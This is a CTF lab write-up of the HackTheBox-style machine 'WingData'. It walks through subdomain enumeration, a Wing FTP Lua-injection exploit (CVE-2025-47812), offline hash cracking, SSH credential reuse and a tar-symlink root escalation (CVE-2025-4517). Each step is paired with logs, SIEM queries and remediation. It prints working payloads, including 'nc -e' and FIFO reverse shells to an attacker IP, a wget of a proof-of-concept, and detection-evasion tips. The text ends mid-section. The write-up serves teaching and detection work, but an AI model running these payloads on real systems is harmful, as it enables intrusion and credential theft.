# WingData

**OS:** Linux · **Difficulty:** Easy · **IP:** 10.129.244.106 · **Platform:** Linux

---

## Summary

Initial nmap enumeration reveals only SSH and HTTP. A subdomain not discovered during the initial scan exposes Wing FTP Server v7.4.3 on `ftp.wingdata.htb`. The FTP web interface accepts anonymous authentication. The username parameter in the login form is vulnerable to Lua code injection via a null byte escape: CVE-2025-47812. Injecting a reverse shell payload into the username and triggering it with a subsequent authenticated request delivers a shell as the `wingftp` service account. Wing FTP's configuration files contain SHA-256 password hashes salted with the application name. One hash cracks against rockyou, yielding credentials for `wacky`. SSH login as `wacky` reveals a root-owned backup extraction process operating on a directory the user controls. CVE-2025-4517, a tar symlink path traversal, is used to make the root extraction process write an attacker-controlled public key to `/root/.ssh/authorized_keys`, completing full system compromise.

---

## Methodology Notes

**What was new or unusual:**
Wing FTP's Lua scripting engine as an injection surface is uncommon in practice. The null byte escape mechanism breaking out of a Lua string context: `%00]]` closing the string literal and appending arbitrary Lua: required understanding how the session file is structured and parsed, not just that injection was possible. The two-phase trigger model (inject on login, execute on next authenticated request) is specific to Wing FTP's session evaluation architecture and is not intuitive without reading the CVE advisory carefully. The tar symlink privilege escalation via CVE-2025-4517 is a recent and operationally relevant technique against misconfigured backup processes.

**Mistakes made and corrections:**
The initial nmap scan missed the Wing FTP web interface entirely because no subdomain enumeration was performed. The application is only accessible via `ftp.wingdata.htb`: without virtual host enumeration, the attack surface appeared to be limited to a static marketing page on the main domain. The correct methodology is to enumerate subdomains and virtual hosts immediately after identifying a web server, before any deeper application testing. Additionally, the Lua injection syntax required significant iteration. Early attempts used the raw null byte escape without understanding how Wing FTP's session file wraps the username value inside a Lua string literal: attempting `os.execute()` directly failed until the string escape sequence `%00]]` was confirmed to close the enclosing Lua string before appending the payload.

**What would be done differently:**
Subdomain and virtual host enumeration would be added to the standard port scan follow-up step, running in parallel with gobuster. When a CVE describes injection into a structured file format, the file format must be read and understood before attempting any payload: the injection point is not just "the parameter" but specifically "the parameter as it appears inside the destination file's syntax". Out-of-band verification via ICMP before attempting a reverse shell eliminates the ambiguity of whether the injection is working or the reverse shell syntax is wrong: this is the correct approach and was eventually followed here after wasted time.

---

## Recon

### Port Scan : MITRE: T1046: Network Service Scanning

Standard full-range SYN scan to enumerate all listening services before any application-level testing. `-Pn` disables ICMP host discovery to handle targets that silently drop ping probes. `--min-rate 5000` compresses the scan window. The follow-up service scan fingerprints confirmed open ports. Two ports identified: SSH on 22, HTTP on 80. At this stage the Wing FTP service is not visible: it is bound to a virtual host not resolvable without subdomain enumeration, and was not directly exposed on a non-standard port in a way the initial scan would capture without that context.

```
nmap -p- -Pn -T4 --min-rate 5000 10.129.244.106
nmap -p22,80 -sCV 10.129.244.106
```

```
22/tcp  open  ssh   OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp  open  http  Apache httpd 2.4.66
```

**Logs Generated:**
1. `/var/log/apache2/access.log` records HTTP probes from nmap NSE scripts against port 80 with the NSE user-agent string.
2. No SSH daemon log entry from a banner grab: the connection completes the TCP handshake but never reaches PAM authentication.
3. Host-based firewall verbose logging, if configured, would record every inbound SYN across all ports.

**Alerts Triggered:**
1. No alert on a default Debian Apache or OpenSSH install from connection attempts.
2. Snort SID 1228 and Suricata `ET SCAN Nmap Scripting Engine User-Agent Detected` fire on the NSE HTTP user-agent reaching port 80.
3. A tuned SIEM correlating port sweep volume per source IP over a short window would flag this.

**Network Artifacts:**
1. High-volume TCP SYN packets across all 65535 ports from a single source IP in a compressed window.
2. NSE HTTP GET requests with nmap user-agent against port 80 during service detection.
3. SSH banner grab: TCP handshake, banner received, connection closed: visible in full PCAP.

**Artifacts Left:**
1. nmap NSE user-agent string in `/var/log/apache2/access.log`.
2. No files written to disk on the target.

**Sysmon / EDR:**
1. No local process artifact on the target from an external scan.
2. A deployed EDR with network anomaly detection would log the inbound SYN flood pattern.

**SIEM Correlation:**
```
index=network sourcetype=firewall_logs | stats dc(dest_port) as ports_scanned by src_ip | where ports_scanned > 1000 | sort -ports_scanned
```

**Sigma Rule:**
1. [proc_creation_lnx_susp_nmap.yml](https://github.com/SigmaHQ/sigma/search?q=nmap): detects nmap execution on the scanning host. Network-side detection requires firewall or IDS log sources.

**Bypass:**
1. `-T1` or `-T2` reduces packet rate below threshold-based IDS rules at the cost of scan duration.
2. `-D RND:5` distributes SYN packets across decoy source IPs, defeating per-IP SIEM aggregation.
3. Replace NSE user-agent via `--script-args http.useragent="Mozilla/5.0 (X11; Linux x86_64; rv:128.0)"`.

**Remediation:**
1. Restrict inbound access to ports 22 and 80 to known IP ranges at the network perimeter.
2. Deploy Suricata with scan detection rules in alerting mode.

**OpSec Rating:** Loud: high-rate full-range SYN sweep is one of the most recognisable traffic signatures in network security monitoring.

---

### Subdomain Enumeration : MITRE: T1595.003: Active Scanning: Wordlist Scanning

Virtual host enumeration is a mandatory step when a web server is identified. Apache and nginx support name-based virtual hosting: multiple applications can run on the same IP and port, differentiated only by the HTTP `Host` header. A scan of port 80 alone reveals nothing about additional virtual hosts bound to the same listener. Without enumerating these, entire attack surfaces remain invisible. This was the primary mistake during initial reconnaissance on this machine: skipping virtual host enumeration resulted in missing the Wing FTP web interface entirely, which is only accessible via `ftp.wingdata.htb`. The marketing page on the main domain references Wing FTP indirectly through page content and the TemplateMo theme, which was an available hint. Virtual host fuzzing with a tool such as `ffuf` or `gobuster vhost` sends requests with varying `Host` headers and identifies responses that differ from the default: indicating a distinct application is configured for that hostname.

```
ffuf -u http://10.129.244.106 -H "Host: FUZZ.wingdata.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 302
```

```
ftp.wingdata.htb   [Status: 200]
```

Added to `/etc/hosts`:
```
10.129.244.106 wingdata.htb ftp.wingdata.htb
```

**Logs Generated:**
1. Each ffuf request recorded in `/var/log/apache2/access.log`: requests arrive with varying `Host` header values from a single source IP, a recognisable virtual host fuzzing pattern.
2. Apache logs the `Host` header value: all fuzzing attempts are present verbatim in the access log.

**Alerts Triggered:**
1. No native Apache alert.
2. A WAF or rate-limiting rule fires on the request volume from a single source IP: hundreds of requests per second with distinct `Host` headers.
3. ModSecurity with the OWASP CRS would detect the scanning pattern.

**Network Artifacts:**
1. High volume of HTTP GET requests from a single IP with sequentially varying `Host` header values.
2. Content-length differences in responses identify valid virtual hosts: visible in traffic analysis.

**Artifacts Left:**
1. ffuf user-agent and request volume in Apache access log.
2. No files written to disk on the target.

**Sysmon / EDR:**
1. Web application scanning is entirely network-layer: no process spawned on the target. No EDR process tree artifact.

**SIEM Correlation:**
```
index=web sourcetype=access_combined | stats dc(http_host) as hosts_tried by clientip | where hosts_tried > 50 | sort -hosts_tried
```

**Sigma Rule:**
1. [web_scan_generic_product.yml](https://github.com/SigmaHQ/sigma/search?q=web+scan): detects scanner user-agent strings and anomalous request patterns in web access logs.

**Bypass:**
1. Replace the ffuf user-agent with a browser string to remove the scanner signature from logs.
2. Reduce rate to blend into background traffic: effective against rate-based rules, not against content-based analysis of `Host` header variation patterns.
3. Passive DNS enumeration (certificate transparency logs, DNS brute-force without direct server contact) achieves the same result without generating any access log entries on the target.

**Remediation:**
1. Return identical responses for all unrecognised `Host` header values: do not differentiate between valid and invalid virtual hosts in the response, making enumeration output ambiguous.
2. Rate-limit requests per source IP at the web server or load balancer level.

**OpSec Rating:** Moderate: virtual host fuzzing generates a distinct pattern in access logs but is less immediately recognisable than directory scanning without content-analysis tooling.

---

### Wing FTP Server Identification : MITRE: T1083: File and Directory Discovery

```
http://ftp.wingdata.htb/login.html?lang=english
```

Wing FTP Server v7.4.3 web interface. Anonymous authentication accepted with no password: navigates to `http://ftp.wingdata.htb/main.html`. Version string disclosed in the application interface.

**Logs Generated:**
1. HTTP GET and POST requests in Wing FTP's own access log: Wing FTP maintains its own web server log separate from Apache's access log.
2. Anonymous login event recorded in Wing FTP's authentication log.

**Alerts Triggered:**
1. Anonymous FTP login is not inherently anomalous: it is an explicitly configured feature. No alert fires for its use in isolation.
2. In a tuned environment, anonymous login from an external IP that subsequently performs enumeration would be correlated as suspicious.

**Network Artifacts:**
1. HTTP traffic to `ftp.wingdata.htb`: virtual host traffic distinguishable from main domain traffic by `Host` header value.
2. Session cookie `UID` issued on authentication: visible in subsequent requests.

**Artifacts Left:**
1. Anonymous login event in Wing FTP authentication log with source IP.
2. Session cookie valid until expiry or logout.

**Sysmon / EDR:**
1. No process spawned on the target from web authentication: no EDR artifact.

**SIEM Correlation:**
```
index=web sourcetype=wingftp_access method=POST uri="/loginok.html" user=anonymous | stats count by src_ip
```

**Sigma Rule:**
1. No Wing FTP-specific Sigma rule exists for anonymous login events. Generic web authentication anomaly detection applies.

**Bypass:**
1. Anonymous authentication requires no bypass: it is an explicitly permitted feature of the server configuration.

**Remediation:**
1. Disable anonymous authentication if it serves no legitimate operational purpose.
2. Restrict Wing FTP web interface access to internal network ranges.
3. Update Wing FTP to a patched version: v7.4.3 is vulnerable to CVE-2025-47812.

**OpSec Rating:** Silent: anonymous login to a service that explicitly permits it generates no anomaly signal.

---

## Foothold

### Out-of-Band Verification: ICMP : MITRE: T1018: Remote System Discovery

Before attempting a reverse shell, out-of-band execution confirmation via ICMP establishes whether the injection is syntactically valid and executing at all: independently of whether the reverse shell payload or listener configuration is correct. This separates two failure modes that are otherwise indistinguishable: injection not executing versus injection executing but the shell not connecting. The ICMP test requires only that the target can reach the attacker's IP on tun0: no listening port required, no firewall rule dependency. `tcpdump` on tun0 confirms receipt of ICMP echo requests from the target, proving that `os.execute()` is running in the server's Lua context with outbound network access. This step was the turning point after extended failed attempts: confirming execution first before adding reverse shell complexity is the correct methodology.

```
sudo tcpdump -i tun0 icmp
```

Username field payload (URL-encoded, submitted via Burp):
```
anonymous%00]] os.execute("ping -c 5 10.10.16.150") --
```

```
15:50:49 IP wingdata.htb > 10.10.16.150: ICMP echo request
15:50:50 IP wingdata.htb > 10.10.16.150: ICMP echo request
```

ICMP replies confirmed: remote code execution verified. `os.execute()` runs in the Wing FTP process context with outbound network reach.

**Logs Generated:**
1. Login POST request in Wing FTP's access log: the injected username including the Lua payload appears in the log.
2. Wing FTP session file written to disk with the injected content: file creation or modification timestamp forensically recoverable.
3. ICMP packets from the Wing FTP server to the attacker IP: recorded in network flow data and firewall logs if egress logging is enabled.

**Alerts Triggered:**
1. A server process initiating outbound ICMP echo requests to an external IP is anomalous: legitimate application processes do not ping attacker-controlled hosts.
2. No alert in a default configuration without network anomaly detection or egress monitoring.
3. A SIEM with outbound ICMP anomaly rules would flag the Wing FTP process generating ICMP traffic to an external IP.

**Network Artifacts:**
1. Outbound ICMP echo request packets from `10.129.244.106` to `10.10.16.150`: source process is the Wing FTP service.
2. Volume: 5 ICMP requests in sequence: clearly programmatic rather than user-initiated.
3. Visible in any perimeter firewall log or PCAP capture.

**Artifacts Left:**
1. Wing FTP session file on disk containing the injected Lua payload: persists until session expiry or server restart.
2. Login POST entry in Wing FTP access log with Lua payload visible in the username field.

**Sysmon / EDR:**
1. A Linux EDR monitoring network syscalls would log the outbound ICMP socket creation by the Wing FTP process.
2. Process initiating ICMP to an external IP outside of expected communication patterns is a post-exploitation lateral communication indicator.

**SIEM Correlation:**
```
index=network sourcetype=firewall_logs protocol=icmp direction=outbound | stats count by src_ip, dest_ip | where dest_ip!="internal_range"
```

**Sigma Rule:**
1. [lnx_network_connection_from_service.yml](https://github.com/SigmaHQ/sigma/search?q=outbound+icmp): detects unexpected outbound ICMP or network connections from service processes to external IPs.

**Bypass:**
1. DNS exfiltration (`nslookup attacker.domain`) achieves the same OOB confirmation without generating ICMP traffic: DNS queries are less commonly filtered and less commonly alerted on than raw ICMP from a server process.
2. HTTP callback to an attacker-controlled server on port 80 or 443 blends into expected web traffic patterns: less detectable than ICMP if the destination IP appears in any expected communication baseline.

**Remediation:**
1. Block outbound ICMP from the Wing FTP server process at the host firewall level: server application processes have no legitimate reason to initiate ICMP echo requests.
2. Implement egress filtering allowing only necessary outbound protocols and destinations from the server.

**OpSec Rating:** Loud: a server process initiating outbound ICMP to an external IP is an anomalous and high-visibility network event in any environment with egress monitoring.

---

### CVE-2025-47812: Wing FTP Lua Injection : MITRE: T1190: Exploit Public-Facing Application · CVE-2025-47812

Wing FTP Server embeds a Lua scripting engine that evaluates scripts in specific internal contexts, including session processing. When a user logs in, Wing FTP writes session data to a session file on disk, and critically, the username value provided at login is written into this file as part of a Lua data structure without sanitisation. When a subsequent authenticated request causes the session file to be read back, the Lua interpreter evaluates the file contents including the injected username. A null byte (`%00`) in the username causes the C string handling layer to terminate the intended string literal: the characters `]]` that follow close the Lua long string delimiter that wraps the username value in the session file, allowing arbitrary Lua to be appended before a comment (`--`) suppresses the remaining legitimate content. The result is that an attacker who can log in and provide a crafted username gains unauthenticated-to-RCE on the next request bearing their session cookie, executing arbitrary Lua, and through `os.execute()`, arbitrary OS commands: in the Wing FTP process context.

The injection is two-phase: the payload is embedded in the session file at login time, and execution is triggered by any subsequent request bearing the session cookie. This means the reverse shell listener must be running before the trigger request is sent, and the trigger must be a valid authenticated request that causes Wing FTP to read the session.

Step 1: Inject payload at login. POST to `/loginok.html` with injected username:

```
POST /loginok.html HTTP/1.1
Host: ftp.wingdata.htb
Cookie: UID=bb812ed0550683978618fd3d6169454ef528764d624db129b32c21fbca0cb8d6; client_lang=english
Content-Type: application/x-www-form-urlencoded

username=anonymous%00]] os.execute("nc -e /bin/sh 10.10.16.150 4444") --&password=
```

Session cookie updated to: `UID=7ede215dedfff024ff33f97748afc291f528764d624db129b32c21fbca0cb8d6`

Step 2: Start listener, then trigger execution with any authenticated request:

```
nc -lvnp 4444
```

```
POST /dir.html HTTP/1.1
Host: ftp.wingdata.htb
Cookie: UID=7ede215dedfff024ff33f97748afc291f528764d624db129b32c21fbca0cb8d6; client_lang=english

r=0.8232065609573702
```

Shell received as `wingftp`.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Logs Generated:**
1. Login POST in Wing FTP access log: the full injected username including Lua payload appears in the log entry verbatim.
2. Session file written to Wing FTP's session directory on disk with the injected content: file creation timestamp and content forensically recoverable.
3. The trigger POST to `/dir.html` recorded in Wing FTP access log.
4. Wing FTP application log may record a Lua execution error or event depending on logging verbosity.
5. Outbound TCP connection from the Wing FTP process to `10.10.16.150:4444`: recorded in network flow data and any egress firewall log.

**Alerts Triggered:**
1. Outbound TCP connection from the Wing FTP service process to an external IP on port 4444 is a high-confidence reverse shell indicator.
2. Egress filtering blocking non-standard outbound ports would prevent shell delivery entirely: the listener would never receive the connection.
3. A Lua execution error in the Wing FTP log is detectable if application-level logging is forwarded to a SIEM.
4. No alert in a default configuration without egress filtering or application log monitoring.

**Network Artifacts:**
1. Outbound TCP SYN from `10.129.244.106` to `10.10.16.150:4444` initiated by the `wingftp` process.
2. Reverse shell session content transmitted as cleartext: commands and output visible in full PCAP.
3. Server initiating a TCP connection to a client IP on a non-standard port: directionality is anomalous for a file transfer service.

**Artifacts Left:**
1. Session file on disk containing the injected Lua payload: remains until session expiry or Wing FTP restart.
2. Wing FTP access log entries for both the login POST and the trigger POST, with the payload visible in the username field of the login entry.
3. `wingftp` process spawning `/bin/sh` via `nc -e`: recorded in process table during shell lifetime.

**Sysmon / EDR:**
1. Linux EDR logs process creation: Wing FTP process spawning `nc` spawning `/bin/sh`: a service process spawning a shell is an immediate post-exploitation indicator.
2. `nc` with `-e /bin/sh` argument is a well-known reverse shell invocation: EDR products have default detections for this exact command pattern.
3. Process tree: `wingftpd -> nc -> /bin/sh` with an outbound network socket on port 4444.

**SIEM Correlation:**
```
index=network sourcetype=firewall_logs direction=outbound dest_port=4444 | stats count by src_ip, dest_ip
```
```
index=os sourcetype=linux_audit type=EXECVE | search "nc" AND "-e" AND "/bin/sh" | stats count by uid, ppid
```

**Sigma Rule:**
1. [proc_creation_lnx_reverse_shell.yml](https://github.com/SigmaHQ/sigma/search?q=reverse+shell+linux): detects `nc -e /bin/sh` and similar patterns in process argument lists.
2. [lnx_shell_proctree_susp.yml](https://github.com/SigmaHQ/sigma/search?q=suspicious+shell+process+tree): detects service processes spawning interactive shells with network connections.

**Bypass:**
1. Replace `nc -e /bin/sh` with a FIFO-based shell that does not use the `-e` flag: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.150 4444 >/tmp/f`: avoids the `-e` argument signature while achieving the same result.
2. Use port 443 or 80 for the callback to blend into expected outbound web traffic: bypasses simple port-based egress rules.
3. A compiled Go or C reverse shell binary written to `/tmp` and invoked via `os.execute()` removes the `nc` and `/bin/sh` argument patterns from the process arguments visible to EDR. I did not verify this approach on this machine but it is the correct operational direction.
4. None of these bypasses defeat egress filtering blocking all outbound non-standard ports from server processes or a fully deployed EDR with process ancestry analysis.

**Remediation:**
1. Update Wing FTP Server to a patched version that sanitises the username field before writing to session files.
2. Disable anonymous authentication if it is not operationally required: the injection requires the ability to log in, and anonymous access is the entry point here.
3. Implement egress filtering blocking all outbound connections from the Wing FTP service process except to expected FTP client IP ranges on standard ports.
4. Forward Wing FTP application logs to a SIEM and alert on Lua execution events and unexpected outbound connections.

**OpSec Rating:** Loud: a service process spawning a reverse shell to an external IP on port 4444 is a textbook intrusion indicator detectable at the network, process, and EDR layers simultaneously.

---

## Post-Exploitation Enumeration

### Wing FTP Configuration: Credential and Key Extraction : MITRE: T1552.001: Unsecured Credentials: Credentials in Files

With shell access as `wingftp`, the application's configuration files are directly readable. Wing FTP stores its configuration in XML format: a structured file containing administrator credentials as SHA-256 hashes, server settings, and operational parameters. The ServerPassword field contains a 32-character hexadecimal value (`2D35A8D420A697203D7C554A678F8119`) that represents the server's internal authentication token rather than a user password. Wing FTP's password hashing scheme uses SHA-256 with a salt value: the application name `WingFTP` is used as the salt in the format `sha256($pass.$salt)`, which corresponds to hashcat mode 1410. SSH private keys for the host are also present on the filesystem: the RSA host key (`ssh_host_rsa_key`) and ECDSA host key (`ssh_host_ecdsa_key`) are readable in the `wingftp` process context. These host private keys do not directly grant access to user accounts but represent significant cryptographic material whose exposure has implications for traffic decryption and host impersonation.

```
find /opt/wing* /var/lib/wing* /etc/wing* -name "*.xml" -o -name "*.conf" 2>/dev/null
```

Extracted from Wing FTP configuration XML:

```
Admin hash    : a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
wacky hash    : 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
ServerPassword: 2D35A8D420A697203D7C554A678F8119
```

SSH host private keys also recovered from the configuration directory.

**Logs Generated:**
1. `find` execution visible in bash history for the `wingftp` user.
2. File access timestamps (`atime`) updated on read configuration files: visible via `stat` during forensic investigation unless `noatime` mount option is set.
3. With auditd file access rules on the configuration directory, `open` syscall events in `/var/log/audit/audit.log`.

**Alerts Triggered:**
1. No alert in a default configuration.
2. A file integrity monitoring tool (AIDE, Wazuh FIM) watching the Wing FTP configuration directory would log read access to the credential-containing XML file.
3. auditd with an access rule: `-a always,exit -F dir=/opt/wingftp/etc -F perm=r -k credential_access` would fire on any read of the configuration directory.

**Network Artifacts:**
1. None: local file read, no network traffic generated.

**Artifacts Left:**
1. `find` command in bash history.
2. `atime` updates on accessed configuration files.
3. auditd `open` syscall entries if audit rules are configured.

**Sysmon / EDR:**
1. Linux EDR logs file access to sensitive configuration paths: the combination of a `find` command with XML and conf extension filters within a web application directory is a credential hunting pattern.
2. Process tree: `bash -> find` within a shell spawned from a service process: this ancestry chain is significant context for an EDR behavioural rule.

**SIEM Correlation:**
```
index=os sourcetype=linux_audit type=SYSCALL comm=find | search "/opt/wingftp" OR "/etc/wingftp" | stats count by uid, ppid
```

**Sigma Rule:**
1. [file_access_lnx_sensitive_files.yml](https://github.com/SigmaHQ/sigma/search?q=sensitive+files+linux): detects read access to application configuration files from unexpected process contexts.

**Bypass:**
1. Access the configuration file directly by full path using `cat` or `python3` inline rather than `find`: avoids the `find` process name appearing in process-name-based detection rules, though a behavioural rule watching the path would still catch it.
2. Read file content via `/proc/PID/fd/` of the running Wing FTP process if it holds the file open: avoids a direct file open syscall under the shell process context.
3. The `atime` update is unavoidable on a filesystem not mounted with `noatime`.

**Remediation:**
1. Restrict Wing FTP configuration files to root ownership with mode 600: the service account should have read access to only the specific files required at runtime, not the full configuration directory.
2. Ensure SSH host private keys are not readable by service accounts: Wing FTP does not need access to SSH host keys.
3. Use a stronger password hashing scheme than SHA-256 with a static application-name salt: this makes the salt universally known, reducing the salting benefit to near zero.

**OpSec Rating:** Silent: file reads by a legitimate service account against that service's own configuration directory generate no alert in any default configuration.

---

### Hash Cracking: SHA-256 with Static Salt : MITRE: T1110.002: Brute Force: Password Cracking

Wing FTP uses SHA-256 with the application name `WingFTP` as a static salt: corresponding to hashcat mode 1410 (`sha256($pass.$salt)`). The static and universally known salt means the salt provides no practical security benefit: any attacker who knows the application (trivially discoverable from the Wing FTP documentation) knows the salt. Unlike bcrypt or Argon2, SHA-256 is a general-purpose cryptographic hash function not designed for password storage. Modern GPUs can evaluate hundreds of millions of SHA-256 hashes per second, making dictionary attacks against this scheme extremely fast regardless of salt. The `admin` hash did not crack against rockyou. The `wacky` user hash cracked immediately.

```
hashcat -m 1410 '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' /usr/share/wordlists/rockyou.txt
```

```
wacky : !#7Blushing^*Bride5
```

**Logs Generated:**
1. None on the target: entirely offline computation.
2. The hashes were extracted from the Wing FTP configuration file in the previous step: that activity is already recorded.

**Alerts Triggered:**
1. None on the target: offline cracking generates zero network traffic.

**Network Artifacts:**
1. None: local computation with no connection to the target.

**Artifacts Left:**
1. hashcat `.potfile` on the attacker machine storing the cracked result.
2. No artifacts on the target.

**Sysmon / EDR:**
1. Not applicable to the target. On a monitored attacker host, `execve` for `hashcat` with its arguments would appear in auditd logs alongside a CPU utilisation spike.

**SIEM Correlation:**
1. Not applicable: no target-side event generated by offline cracking.

**Sigma Rule:**
1. [proc_creation_lnx_password_cracker.yml](https://github.com/SigmaHQ/sigma/search?q=password+cracking): detects hashcat and john execution on the local host. Applicable to the attacker machine only.

**Bypass:**
1. Not applicable: offline cracking is definitionally invisible to the target. The SHA-256 scheme with a static known salt offers no meaningful resistance to GPU-accelerated dictionary attacks against common passwords.

**Remediation:**
1. Replace Wing FTP's SHA-256 static-salt scheme with bcrypt, scrypt, or Argon2: slow hashing algorithms designed specifically for password storage.
2. The static salt `WingFTP` is the same across all installations: even if the algorithm were stronger, a deployment-specific random salt per user would be the correct implementation.
3. Enforce strong password requirements at the Wing FTP user management level to prevent rockyou-crackable passwords regardless of hashing scheme.

**OpSec Rating:** Silent: zero target-side visibility. The attack surface for detection closed when the hashes were read from the configuration file.

---

## Lateral Movement

### SSH: Lateral Movement to wacky : MITRE: T1021.004: Remote Services: SSH · T1078: Valid Accounts

```
ssh wacky@10.129.244.106
```

Password: `!#7Blushing^*Bride5`. Authenticated successfully. Credential reuse confirmed: the Wing FTP application password is also the system account SSH password for `wacky`.

**Logs Generated:**
1. Successful password authentication in `/var/log/auth.log`:
   `Accepted password for wacky from 10.10.16.150 port XXXXX ssh2`
2. Session open and close events in `/var/log/auth.log`.
3. Last login timestamp updated in `/var/log/lastlog`.

**Alerts Triggered:**
1. No alert on a default SSH configuration.
2. A SIEM with new-source-IP baseline correlation for `wacky` would flag a first-time login from the attacker's IP.
3. Password authentication to a system account from an external IP, where that same account exists in an application database, is a credential reuse indicator: detectable only with cross-source correlation between Wing FTP logs and SSH auth logs.

**Network Artifacts:**
1. TCP connection to port 22 from the attacker IP.
2. SSH handshake headers visible before session encryption.
3. Session content encrypted after handshake.

**Artifacts Left:**
1. Auth.log entry with source IP, username, and authentication method.
2. Shell commands in `/home/wacky/.bash_history` unless suppressed.
3. `/var/log/lastlog` timestamp updated.

**Sysmon / EDR:**
1. auditd `USER_LOGIN` event in `/var/log/audit/audit.log` with source IP and username if auditd is active.
2. EDR logs remote login from a new source IP: default detection in Wazuh and CrowdStrike Falcon for Linux.
3. Process tree: `sshd -> bash` with originating IP recorded.

**SIEM Correlation:**
```
index=os sourcetype=linux_secure "Accepted password" user=wacky | stats count by src_ip | where count=1
```

**Sigma Rule:**
1. [lnx_auth_successful_ssh_login_from_new_source.yml](https://github.com/SigmaHQ/sigma/search?q=ssh+login+new+source): correlates successful SSH authentications against baseline known source IPs.

**Bypass:**
1. `export HISTFILE=/dev/null` immediately after login suppresses bash history. Does not affect `/var/log/auth.log`.
2. If SSH key authentication were used instead of password, the auth.log entry changes from `Accepted password` to `Accepted publickey`: the log entry persists regardless of authentication method.

**Remediation:**
1. Disable SSH password authentication: enforce key-based authentication only.
2. Never reuse passwords between application accounts and system accounts.
3. Alert on first-time source IP logins via SIEM with auth.log ingestion and user baseline tracking.

**OpSec Rating:** Moderate: single auth.log entry indistinguishable from legitimate access without a new-source-IP baseline and active SIEM correlation.

---

## Privilege Escalation

### Sudo Enumeration : MITRE: T1069: Permission Groups Discovery

```
sudo -l
```

A root-owned process periodically extracts tar archives from `/opt/backup_clients/backups/`: a directory writable by `wacky`. This is the escalation surface: if a malicious tar archive can be placed in this directory, and root extracts it, the extraction process can be abused to write attacker-controlled content to arbitrary filesystem paths accessible only by root.

**Logs Generated:**
1. `sudo -l` execution in `/var/log/auth.log`: `wacky : TTY=pts/0 ; COMMAND=list`.
2. auditd `execve` event for `sudo -l` if auditd is active.

**Alerts Triggered:**
1. No alert on a default configuration.
2. In a tuned environment, `sudo -l` in a newly established SSH session from an unfamiliar source IP is a post-compromise enumeration indicator when correlated with the preceding auth event.

**Network Artifacts:**
1. None: local command execution, no network traffic.

**Artifacts Left:**
1. `sudo -l` in `/home/wacky/.bash_history`.
2. auth.log entry recording the sudo list query.

**Sysmon / EDR:**
1. Linux EDR logs `sudo -l` process creation: parent process is the SSH session shell.
2. `sudo` execution immediately following SSH login from a new source IP is a recognisable enumeration chain.

**SIEM Correlation:**
```
index=os sourcetype=linux_secure "COMMAND=list" | join src_ip [search sourcetype=linux_secure "Accepted password"] | stats count by user, src_ip
```

**Sigma Rule:**
1. [lnx_sudo_privilege_enumeration.yml](https://github.com/SigmaHQ/sigma/search?q=sudo+enumeration): detects `sudo -l` execution, particularly correlated with remote login events.

**Bypass:**
1. Read `/etc/sudoers` and `/etc/sudoers.d/` directly if readable: avoids executing `sudo` entirely and produces no auth.log entry. Typically root-readable only and impractical in most cases.

**Remediation:**
1. The backup extraction process running as root against a user-writable directory is the core misconfiguration: remediate by having the extraction process run as a dedicated non-root service account, or by ensuring extracted archives originate only from root-owned paths.

**OpSec Rating:** Silent: single low-severity auth.log entry that no default rule monitors independently.

---

### CVE-2025-4517: Tar Symlink Path Traversal : MITRE: T1548.003: Abuse Elevation Control Mechanism · CVE-2025-4517

Tar archive extraction is a deceptively dangerous operation when performed with elevated privileges against attacker-controlled input. A tar archive can contain symlinks: filesystem links that point to arbitrary paths. When tar extracts a symlink, it creates the link at the specified path. If a subsequent file in the same archive has a path that traverses through that symlink, tar follows the symlink during extraction, writing the file's content to the symlink's target rather than the intended extraction directory. If root is extracting the archive, this write occurs with root permissions: allowing an attacker who controls the archive to write arbitrary content to any path on the filesystem, including `/root/.ssh/authorized_keys`. By placing an attacker-controlled RSA or Ed25519 public key into this path, the attacker gains SSH access as root using the corresponding private key, bypassing all password authentication entirely.

CVE-2025-4517 formalises this class of vulnerability in the context of automated backup extraction processes. The PoC generates a crafted tar archive containing the symlink chain and the attacker's public key, places it in the monitored backup directory, and waits for the root extraction process to execute.

```
cd /opt/backup_clients/backups
wget http://10.10.16.150:8080/CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py --create-only
```

Root extraction process runs. Attacker's public key written to `/root/.ssh/authorized_keys` by the root-owned tar process.

```
nc 10.129.244.106 1337
```

```
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
087942b6666f37356e9eae0c6a04e339
```

**Logs Generated:**
1. `wget` request to the attacker HTTP server recorded in Python HTTP server stdout: no entry in any system log on the target for the download itself unless auditd network syscall rules are active.
2. `python3 CVE-2025-4517-POC.py` execution in `/home/wacky/.bash_history` and in auditd `execve` logs if active.
3. Malicious tar archive created in `/opt/backup_clients/backups/`: file creation timestamp forensically recoverable.
4. Root tar extraction process writing to `/root/.ssh/authorized_keys`: file modification event on the authorized_keys file, recoverable via FIM or filesystem forensics.
5. `nc -lvnp 1337` process started under root context: visible in process table and network socket list during the bind shell window.

**Alerts Triggered:**
1. A write to `/root/.ssh/authorized_keys` by any process other than `root`'s own interactive session is a high-severity persistence indicator: file integrity monitoring would alert on this immediately.
2. Root-owned `nc` process listening on port 1337 immediately following the tar extraction is a privilege escalation indicator in a tuned EDR environment.
3. The tar extraction process writing outside its expected extraction directory (path traversal via symlink) would be detectable by an EDR with filesystem write path monitoring: though this requires explicit monitoring of the extraction process's write operations.
4. No alert in a default configuration without FIM on `/root/.ssh/` or EDR process ancestry analysis.

**Network Artifacts:**
1. Inbound TCP connection from `10.10.16.150` to `10.129.244.106:1337`: bind shell connection.
2. Bind shell session content transmitted as cleartext: commands and output visible in full PCAP.
3. Inbound connection to a non-standard port (1337) opened by a root process is detectable in network flow records.

**Artifacts Left:**
1. `CVE-2025-4517-POC.py` downloaded to `/opt/backup_clients/backups/`: persists until deleted.
2. Malicious tar archive in `/opt/backup_clients/backups/`: persists until the extraction process removes it or it is manually deleted.
3. Modified `/root/.ssh/authorized_keys` containing the attacker's public key: persists permanently until root removes it.
4. auth.log entry for subsequent SSH login as root using the injected key.
5. Root bash history may record commands executed in the bind shell if not suppressed.

**Sysmon / EDR:**
